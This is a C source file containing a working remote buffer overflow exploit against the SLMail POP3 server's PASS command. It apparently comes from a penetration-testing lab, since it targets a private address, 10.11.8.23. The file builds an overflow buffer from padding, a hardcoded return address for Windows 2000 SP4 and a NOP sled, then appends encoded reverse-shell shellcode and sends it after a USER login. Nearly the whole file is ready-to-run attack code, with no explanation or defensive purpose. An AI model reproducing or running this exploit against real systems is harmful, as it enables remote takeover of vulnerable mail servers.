#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
//#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define retadd "\x8f\x35\x4a\x5f"
#define port 110

/* revshell ?????? ???????? ????????*/
//unsigned char shellcode[] =
unsigned char shellcode[] =
"\xd9\xcd\xbe\xc7\xcf\x27\x0c\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x77\x17\x03\x77\x17\x83\x28\x33\xc5\xf9\x4a\x24\x88"
"\x02\xb2\xb5\xed\x8b\x57\x84\x2d\xef\x1c\xb7\x9d\x7b\x70\x34"
"\x55\x29\x60\xcf\x1b\xe6\x87\x78\x91\xd0\xa6\x79\x8a\x21\xa9"
"\xf9\xd1\x75\x09\xc3\x19\x88\x48\x04\x47\x61\x18\xdd\x03\xd4"
"\x8c\x6a\x59\xe5\x27\x20\x4f\x6d\xd4\xf1\x6e\x5c\x4b\x89\x28"
"\x7e\x6a\x5e\x41\x37\x74\x83\x6c\x81\x0f\x77\x1a\x10\xd9\x49"
"\xe3\xbf\x24\x66\x16\xc1\x61\x41\xc9\xb4\x9b\xb1\x74\xcf\x58"
"\xcb\xa2\x5a\x7a\x6b\x20\xfc\xa6\x8d\xe5\x9b\x2d\x81\x42\xef"
"\x69\x86\x55\x3c\x02\xb2\xde\xc3\xc4\x32\xa4\xe7\xc0\x1f\x7e"
"\x89\x51\xfa\xd1\xb6\x81\xa5\x8e\x12\xca\x48\xda\x2e\x91\x04"
"\x2f\x03\x29\xd5\x27\x14\x5a\xe7\xe8\x8e\xf4\x4b\x60\x09\x03"
"\xab\x5b\xed\x9b\x52\x64\x0e\xb2\x90\x30\x5e\xac\x31\x39\x35"
"\x2c\xbd\xec\x9a\x7c\x11\x5f\x5b\x2c\xd1\x0f\x33\x26\xde\x70"
"\x23\x49\x34\x19\xce\xb0\xdf\x2c\x04\xba\x50\x59\x18\xba\x7f"
"\xc5\x95\x5c\x15\xe5\xf3\xf7\x82\x9c\x59\x83\x33\x60\x74\xee"
"\x74\xea\x7b\x0f\x3a\x1b\xf1\x03\xab\xeb\x4c\x79\x7a\xf3\x7a"
"\x15\xe0\x66\xe1\xe5\x6f\x9b\xbe\xb2\x38\x6d\xb7\x56\xd5\xd4"
"\x61\x44\x24\x80\x4a\xcc\xf3\x71\x54\xcd\x76\xcd\x72\xdd\x4e"
"\xce\x3e\x89\x1e\x99\xe8\x67\xd9\x73\x5b\xd1\xb3\x28\x35\xb5"
"\x42\x03\x86\xc3\x4a\x4e\x70\x2b\xfa\x27\xc5\x54\x33\xa0\xc1"
"\x2d\x29\x50\x2d\xe4\xe9\x60\x64\xa4\x58\xe9\x21\x3d\xd9\x74"
"\xd2\xe8\x1e\x81\x51\x18\xdf\x76\x49\x69\xda\x33\xcd\x82\x96"
"\x2c\xb8\xa4\x05\x4c\xe9"; 

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
//    memset(off, 0x41, 2605);
    memset(off, 0x41, 2606);
//    char *nop = malloc(13);
//    memset(nop, 0x00, 13);
//    memset(nop, 0x90, 12);

    char *nop = malloc(8);
    memset(nop, 0x00,8);
    memset(nop, 0x90,8);

    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.8.23");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}

